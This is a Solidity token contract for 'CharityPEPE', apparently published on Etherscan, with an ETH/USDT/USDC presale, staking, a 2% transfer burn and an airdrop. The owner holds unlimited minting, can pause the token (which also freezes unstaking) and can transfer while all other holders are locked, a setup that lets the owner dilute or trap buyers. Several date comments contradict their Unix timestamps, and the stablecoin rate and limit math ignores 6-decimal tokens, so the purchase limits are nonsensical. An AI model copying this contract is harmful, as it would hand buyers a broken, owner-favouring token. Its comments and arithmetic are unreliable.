/**
 *Submitted for verification at Etherscan.io on 2025-03-03
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/**
 * @title CharityPEPE - A token contract with presale, staking, and burning features
 * @notice This contract allows presale purchases, staking with rewards, and burns 2% of each transfer
 */
contract CharityPEPE {
    string public name = "CharityPEPE";
    string public symbol = "CPEPE";
    uint256 public decimals = 18;
    uint256 public totalSupply;

    // Constants with documentation
    uint256 private constant BURN_FEE = 20000; // 2% burn fee in basis points (20000/1000000 = 2%)
    uint256 private constant BURN_DENOMINATOR = 1000000; // Denominator for burn fee calculation
    uint256 private constant TRANSFER_LOCK_TIME = 1765555200; // Transfers locked for non-owners until Jan 10, 2026 (Unix timestamp)
    uint256 private constant STAGE1_START = 1746643200; // Presale Stage 1 start: March 7, 2025, 20:00 UTC
    uint256 private constant STAGE1_END = 1759180800;   // Presale Stage 1 end: July 30, 2025, 20:00 UTC
    uint256 private constant STAGE2_START = 1759181100; // Presale Stage 2 start: July 30, 2025, 20:05 UTC
    uint256 private constant STAGE2_END = 1765036800;   // Presale Stage 2 end: January 1, 2026, 20:00 UTC
    uint256 private constant STAGE1_RATE = 10000;       // Stage 1 rate: 1 ETH = 10,000 CPEPE
    uint256 private constant STAGE2_RATE = 5000;        // Stage 2 rate: 1 ETH = 5,000 CPEPE
    address private constant USDT_ADDRESS = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT Mainnet contract address
    uint256 private constant USDT_RATE = 1000;          // 1 USDT = 1,000 CPEPE
    address private constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC Mainnet contract address
    uint256 private constant USDC_RATE = 1000;          // 1 USDC = 1,000 CPEPE
    uint256 private constant MAX_PURCHASE = 100 ether;  // Max ETH purchase per transaction
    uint256 private constant MIN_PURCHASE = 0.01 ether; // Min ETH purchase per transaction
    uint256 private constant MAX_TOKENS_FOR_SALE = 5e11 * (10 ** 18); // 500 billion CPEPE for presale
    uint256 private constant MIN_STAKE_PERIOD = 1 days; // Minimum staking period before unstake allowed

    address private _owner;
    bool private _paused;
    bool private _locked;
    uint256 private _tokensSold;
    mapping(address => uint256) private _lastUnstakeBlock;
    mapping(address => uint256) private _balanceOf;
    mapping(address => mapping(address => uint256)) private _allowance;
    mapping(address => uint256) private _stakedBalance;
    mapping(address => uint256) private _stakeStartTime;
    mapping(address => uint256) private _stakePeriod;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Mint(address indexed to, uint256 value);
    event Paused(address account);
    event Unpaused(address account);
    event Staked(address indexed user, uint256 amount, uint256 period);
    event Unstaked(address indexed user, uint256 amount, uint256 reward);
    event Airdrop(address indexed from, uint256 totalAmount);
    event TokensPurchased(address indexed buyer, uint256 amount, string currency);
    event ETHWithdrawn(address indexed owner, uint256 amount);
    event USDTWithdrawn(address indexed owner, uint256 amount);
    event USDCWithdrawn(address indexed owner, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }

    modifier whenNotPaused() {
        require(!_paused, "Paused");
        _;
    }

    modifier nonReentrant() {
        require(!_locked, "Reentrant call");
        _locked = true;
        _;
        _locked = false;
    }

    constructor() payable {
        _owner = msg.sender;
        totalSupply = 1e12 * (10 ** decimals); // 1 trillion tokens
        _balanceOf[msg.sender] = totalSupply;
    }

    // Presale purchase with ETH
    function buyWithETH() public payable whenNotPaused nonReentrant {
        require(block.timestamp >= STAGE1_START && block.timestamp <= STAGE2_END, "Sale not active");
        require(msg.value >= MIN_PURCHASE, "Below min purchase");
        require(msg.value <= MAX_PURCHASE, "Exceeds max purchase");
        uint256 rate = (block.timestamp <= STAGE1_END) ? STAGE1_RATE : STAGE2_RATE;
        uint256 tokenAmount = msg.value * rate;
        require(_balanceOf[_owner] >= tokenAmount, "Low owner balance");
        require(_tokensSold + tokenAmount <= MAX_TOKENS_FOR_SALE, "Exceeds presale limit");
        
        _balanceOf[_owner] -= tokenAmount;
        _balanceOf[msg.sender] += tokenAmount;
        _tokensSold += tokenAmount;
        emit TokensPurchased(msg.sender, tokenAmount, "ETH");
    }

    // Presale purchase with USDT
    function buyWithUSDT(uint256 usdtAmount) public whenNotPaused nonReentrant {
        require(block.timestamp >= STAGE1_START && block.timestamp <= STAGE2_END, "Sale not active");
        require(usdtAmount >= MIN_PURCHASE / USDT_RATE, "Below min purchase");
        require(usdtAmount <= MAX_PURCHASE / USDT_RATE, "Exceeds max purchase");
        uint256 tokenAmount = usdtAmount * USDT_RATE;
        require(_balanceOf[_owner] >= tokenAmount, "Low owner balance");
        require(_tokensSold + tokenAmount <= MAX_TOKENS_FOR_SALE, "Exceeds presale limit");
        
        uint256 balanceBefore = IERC20(USDT_ADDRESS).balanceOf(_owner);
        require(IERC20(USDT_ADDRESS).transferFrom(msg.sender, _owner, usdtAmount), "USDT transfer failed");
        uint256 balanceAfter = IERC20(USDT_ADDRESS).balanceOf(_owner);
        require(balanceAfter >= balanceBefore + usdtAmount, "Invalid USDT transfer");

        _balanceOf[_owner] -= tokenAmount;
        _balanceOf[msg.sender] += tokenAmount;
        _tokensSold += tokenAmount;
        emit TokensPurchased(msg.sender, tokenAmount, "USDT");
    }

    // Presale purchase with USDC
    function buyWithUSDC(uint256 usdcAmount) public whenNotPaused nonReentrant {
        require(block.timestamp >= STAGE1_START && block.timestamp <= STAGE2_END, "Sale not active");
        require(usdcAmount >= MIN_PURCHASE / USDC_RATE, "Below min purchase");
        require(usdcAmount <= MAX_PURCHASE / USDC_RATE, "Exceeds max purchase");
        uint256 tokenAmount = usdcAmount * USDC_RATE;
        require(_balanceOf[_owner] >= tokenAmount, "Low owner balance");
        require(_tokensSold + tokenAmount <= MAX_TOKENS_FOR_SALE, "Exceeds presale limit");
        
        uint256 balanceBefore = IERC20(USDC_ADDRESS).balanceOf(_owner);
        require(IERC20(USDC_ADDRESS).transferFrom(msg.sender, _owner, usdcAmount), "USDC transfer failed");
        uint256 balanceAfter = IERC20(USDC_ADDRESS).balanceOf(_owner);
        require(balanceAfter >= balanceBefore + usdcAmount, "Invalid USDC transfer");

        _balanceOf[_owner] -= tokenAmount;
        _balanceOf[msg.sender] += tokenAmount;
        _tokensSold += tokenAmount;
        emit TokensPurchased(msg.sender, tokenAmount, "USDC");
    }

    // Withdraw ETH (owner only)
    function withdrawETH() public onlyOwner nonReentrant {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to withdraw");
        (bool sent, ) = payable(_owner).call{value: balance}("");
        require(sent, "ETH withdrawal failed");
        emit ETHWithdrawn(_owner, balance);
    }

    // Withdraw USDT (owner only)
    function withdrawUSDT() public onlyOwner nonReentrant {
        uint256 balance = IERC20(USDT_ADDRESS).balanceOf(address(this));
        require(balance > 0, "No USDT to withdraw");
        uint256 ownerBalanceBefore = IERC20(USDT_ADDRESS).balanceOf(_owner);
        require(IERC20(USDT_ADDRESS).transfer(_owner, balance), "USDT withdrawal failed");
        uint256 ownerBalanceAfter = IERC20(USDT_ADDRESS).balanceOf(_owner);
        require(ownerBalanceAfter >= ownerBalanceBefore + balance, "Invalid USDT withdrawal");
        emit USDTWithdrawn(_owner, balance);
    }

    // Withdraw USDC (owner only)
    function withdrawUSDC() public onlyOwner nonReentrant {
        uint256 balance = IERC20(USDC_ADDRESS).balanceOf(address(this));
        require(balance > 0, "No USDC to withdraw");
        uint256 ownerBalanceBefore = IERC20(USDC_ADDRESS).balanceOf(_owner);
        require(IERC20(USDC_ADDRESS).transfer(_owner, balance), "USDC withdrawal failed");
        uint256 ownerBalanceAfter = IERC20(USDC_ADDRESS).balanceOf(_owner);
        require(ownerBalanceAfter >= ownerBalanceBefore + balance, "Invalid USDC withdrawal");
        emit USDCWithdrawn(_owner, balance);
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function paused() external view returns (bool) {
        return _paused;
    }

    function tokensSold() external view returns (uint256) {
        return _tokensSold;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balanceOf[account];
    }

    function allowance(address account, address spender) external view returns (uint256) {
        return _allowance[account][spender];
    }

    // Mint new tokens (owner only)
    function mint(address to, uint256 value) public onlyOwner nonReentrant returns (bool) {
        require(to != address(0), "Invalid address");
        totalSupply += value;
        _balanceOf[to] += value;
        emit Mint(to, value);
        return true;
    }

    function pause() public onlyOwner {
        require(!_paused, "Already paused");
        _paused = true;
        emit Paused(msg.sender);
    }

    function unpause() public onlyOwner {
        require(_paused, "Not paused");
        _paused = false;
        emit Unpaused(msg.sender);
    }

    // Emergency withdrawal of staked tokens (owner only)
    function emergencyWithdraw(address account) public onlyOwner nonReentrant {
        require(_paused, "Not paused");
        require(account != address(0), "Invalid address"); // Explicit check for valid account
        uint256 stakedAmount = _stakedBalance[account];
        if (stakedAmount > 0) { // Ensure non-zero withdrawal
            _stakedBalance[account] = 0;
            _balanceOf[account] += stakedAmount;
            emit Unstaked(account, stakedAmount, 0);
        }
        // No external calls or gas price dependencies - safe from manipulation
    }

    // Stake tokens for 3 or 12 months
    function stake(uint256 amount, uint256 period) public whenNotPaused nonReentrant {
        require(period == 3 || period == 12, "Invalid period"); // Only 3 or 12 months allowed
        require(amount > 0, "Zero amount");
        require(amount <= _balanceOf[msg.sender], "Low balance");

        _balanceOf[msg.sender] -= amount;
        _stakedBalance[msg.sender] += amount;
        _stakeStartTime[msg.sender] = block.timestamp;
        _stakePeriod[msg.sender] = period;
        emit Staked(msg.sender, amount, period);
    }

    // Unstake tokens with rewards after period ends
    function unstake() public whenNotPaused nonReentrant {
        require(_stakedBalance[msg.sender] > 0, "No stake");
        require(_lastUnstakeBlock[msg.sender] != block.number, "Already unstaked this block");
        address sender = msg.sender;
        uint256 stakeTime = block.timestamp - _stakeStartTime[sender];
        require(stakeTime >= MIN_STAKE_PERIOD, "Stake period too short"); // Prevent front-running

        uint256 amount = _stakedBalance[sender];
        uint256 periodInSeconds = _stakePeriod[sender] * 30 days;
        require(stakeTime >= periodInSeconds, "Not matured");

        uint256 rewardRate = (_stakePeriod[sender] == 3) ? 6 : 12;
        uint256 reward = (amount * rewardRate * stakeTime) / (100 * 365 days);
        uint256 totalAmount = amount + reward;

        _stakedBalance[sender] = 0;
        _balanceOf[sender] += totalAmount;
        totalSupply += reward;
        _lastUnstakeBlock[sender] = block.number;
        emit Unstaked(sender, amount, reward);
    }

    // Transfer tokens with 2% burn
    function transfer(address to, uint256 amount) public whenNotPaused nonReentrant returns (bool) {
        require(to != address(0), "Invalid address");
        require(amount > 0, "Zero amount");
        address sender = msg.sender;
        require(_balanceOf[sender] >= amount, "Low balance");
        require(sender == _owner || block.timestamp > TRANSFER_LOCK_TIME, "Locked until Jan 10, 2026"); // Non-owners locked until timestamp

        uint256 burnAmount = (amount * BURN_FEE) / BURN_DENOMINATOR;
        uint256 transferAmount = amount - burnAmount;

        _balanceOf[sender] -= amount;
        _balanceOf[to] += transferAmount;
        totalSupply -= burnAmount;
        emit Transfer(sender, to, transferAmount);
        emit Burn(sender, burnAmount);
        return true;
    }

    // Approve spender to transfer tokens on behalf of owner
    function approve(address spender, uint256 value) public whenNotPaused returns (bool) {
        require(spender != address(0), "Invalid spender");
        require(value <= totalSupply, "Value exceeds total supply");
        _allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    // Transfer tokens from another address with 2% burn
    function transferFrom(address from, address to, uint256 value) public whenNotPaused nonReentrant returns (bool) {
        require(from != address(0), "Invalid from");
        require(to != address(0), "Invalid to");
        require(value > 0, "Zero value");
        require(_balanceOf[from] >= value, "Low balance");
        require(_allowance[from][msg.sender] >= value, "Low allowance"); // Allowance checked before state changes
        require(from == _owner || block.timestamp > TRANSFER_LOCK_TIME, "Locked until Jan 10, 2026"); // Non-owners locked until timestamp

        uint256 burnAmount = (value * BURN_FEE) / BURN_DENOMINATOR;
        uint256 transferAmount = value - burnAmount;

        _balanceOf[from] -= value;
        _balanceOf[to] += transferAmount;
        totalSupply -= burnAmount;
        _allowance[from][msg.sender] -= value;
        emit Transfer(from, to, transferAmount);
        emit Burn(from, burnAmount);
        return true;
    }

    // Airdrop tokens to multiple recipients (owner only)
    function airdrop(address[] memory recipients, uint256[] memory values) public onlyOwner nonReentrant {
        uint256 len = recipients.length;
        require(len == values.length, "Length mismatch");
        require(len > 0, "No recipients");
        require(len <= 100, "Too many recipients"); // Limited to prevent gas issues

        address sender = msg.sender;
        uint256 totalAirdrop = 0;
        for (uint256 i; i < len; ++i) {
            totalAirdrop += values[i];
        }
        require(totalAirdrop <= _balanceOf[sender], "Low balance for airdrop");

        for (uint256 i; i < len; ++i) {
            address recipient = recipients[i];
            uint256 value = values[i];
            require(recipient != address(0), "Invalid address");
            _balanceOf[sender] -= value;
            _balanceOf[recipient] += value;
            emit Transfer(sender, recipient, value);
        }
        emit Airdrop(sender, totalAirdrop);
    }
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}